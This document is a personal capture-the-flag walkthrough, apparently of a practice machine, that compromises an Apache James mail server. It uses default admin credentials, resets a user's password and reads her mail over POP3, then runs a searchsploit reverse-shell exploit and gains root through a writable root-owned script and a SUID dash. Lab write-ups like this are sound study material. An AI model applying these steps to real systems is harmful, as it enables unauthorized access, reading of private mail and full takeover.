Nmap showed basic ports, but a deep nmap scan showed 4555 open as well
25 is SMPT server .110 is POP3, which users use to send/recv mails on the smtp
port 119 nntp (Network news transfer protocol), which is used to transports Usenet news articles (netnews) among the news servers so that the end-user client applications can post/read the articles.
port 4555, RSIP, which is used to list the users of the SMTP server and manage them.

---
port 4555 rsip
used telnet to login to it
`telnet IP 4555`
default creds for James email stuff(we gathered from banner grabbing nc -nv IP 25/110)
was root:root
```
listusers
setpassword mindy password
```

To now access the email of mindy, IppSec showed using thunderbird. But it wasnt working for me. Had to go with telnet

`telnet IP 110`
--wait for +OK
```
USER mindy
PASS password
--+OK
LIST
RETR 1
RETR 2
```
The second mail had a password for her ssh. however, when we log into ssh, it is an rbash, very restricted, cant do much

Now, we `searchsploit James 2.3.2`, which gives us an exact exploit, which needs someone to logs into the ssh, and it will grant us a rev shell
Tried modifying the payload to mkfifo, dint work. went with /bin/dev/tcp/IP/PORT

Run the payload, start listening, log into ssh
mindy
Once we are mindy, we see a file owned by root, with write access over it /opt/tmp.py
So, we modify it to send a mkfifo rev shell
And root!

Alternatively, we can modify the /opt/tmp.py to do
`chmod 4755 /bin/dash` (you can get dash by doing which dash)
Note - dash is a terminal kinda thing, usually symlinked to bash
But occassionally, it wont be, and that is when we need to do this.
Note - we could also get the script to add us to sudoers, but sudo wasn't a thing, and sudoers file did not even exist.